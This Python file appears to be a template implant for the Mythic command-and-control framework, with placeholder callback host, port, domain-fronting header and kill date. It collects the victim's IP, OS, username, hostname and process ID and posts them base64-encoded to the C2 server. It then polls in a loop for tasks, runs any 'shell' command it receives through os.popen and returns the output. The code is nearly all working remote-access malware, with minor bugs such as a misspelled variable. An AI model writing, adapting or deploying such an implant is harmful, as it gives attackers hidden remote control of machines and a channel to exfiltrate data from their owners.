import requests as rq
import socket
import platform
import os
import json
import base64
import time 
agent = {
	"Server":"callback_host",
	"Port":"callback_port",
	"URI":"/post_uri",
	"PayloadUUID":"UUID_Here",
	"UUID":"",
	"Headers":headers,
	"HostHeader":"domain_front",
	"Sleep": callback_interval,
	"Jitter":callback_jitter,
	"KillDate":"killdate",
	"Script":""
}

def PostRequest(data):
	Headers = []
	for i in agent["Headers"]:
		Headers.append({i["key"]:i['value']})
	try:
		r = rq.post(agent["Server"]+agent["URI"], data, Headers)
		return r.content
	except Exception as e:
		return e

def getEncodedJson(data,uuid):
	jsonData = json.dumps(data)
	sendData = uuid+str(jsonData)
	return base64.b64encode(sendData.encode())

def SendCheckin():
	data = {
		"action":"checkin",
		"ip":socket.gethostbyname(socket.gethostname()),
		"os":platform.release(),
		"user":os.getlogin(),
		"host":socket.gethostname(),
		"domain":"",
		"pid":os.getpid(),
		"uuid":agent["PayloadUUID"],
		"architecture":platform.system()
	}
	#jsonData = json.dumps(data)
	#print("Checkin Data:" + str(jsonData))
	#sendData = agent["PayloadUUID"] + str(jsonData)
	#encodedData = base64.b64encode(sendData.encode())
	
	response = PostRequest(getEncodedJson(data,agent["PayloadUUID"]))
	decodedResponse = base64.b64decode(response)[36:]
	print("Mythic Response: " + str(decodedResponse))
	
	responseData = json.loads(decodedResponse)
	
	if responseData["status"] == "success":
		agent["UUID"] = responseData["id"]
		return True
	else:
		return False
		
def getTasks():
	data = {
		"action":"get_tasking",
		"tasking_size":1,
	}
	sendData = getEncodedJson(data,agent["UUID"])
	response = PostRequest(sendData)
	decodedResponse = base64.b64decode(response)[36:]
	print("Mythic Response: " + str(decodedResponse))
	
	responseData = json.loads(decodedResponse)["tasks"]
	
	if len(responseData) > 0:
		res = responseData[0]
		print("RESPONSE" + str(res))
		return res


def runTask(task):
	print(task)
	data = {
		"action":"post_response",
		"responses":[{"task_id":task["id"],}],
		}
		
	if task['command'] == "shell":
		command = json.loads(task['parameters'])
		print(command)
		returnVal = shell(command["command"])

		data["responses"][0]["user_output"] = returnVal
	elif task['command'] == "exit":
		returnVal = "Exited"
		ex()
	else:
		returnVal = "Not Implemented"
		data["responses"][0]["user_output"] = returnVal
	
	response = PostRequest(getEncodedJson(data,agent["UUID"]))
	decodedResponse = base64.b64decode(response)[36:]
	print("Task - Mythic Response: " + str(decodedResponse))
	return True
	
def shell(param):
	cmd = os.popen(param)
	return cmd.read()
	
def ex():
	print("EXITING")
	exit()

tasks = []

print(SendCheckin())
while True:
	print("Contacting C2")
	task = getTasks()
	tasks.append(task)
	#print(tasks)
	#print(len(tasks))
	if tasks[0] == None:
		tasks.pop(0)
	if len(tasks) > 0:
		if runTask(tasks[0]):
			tasks.pop(0)
		else:
			print("Error running: " + tasks[1])
			taks.pop(0)
			
	time.sleep(agent["Sleep"])
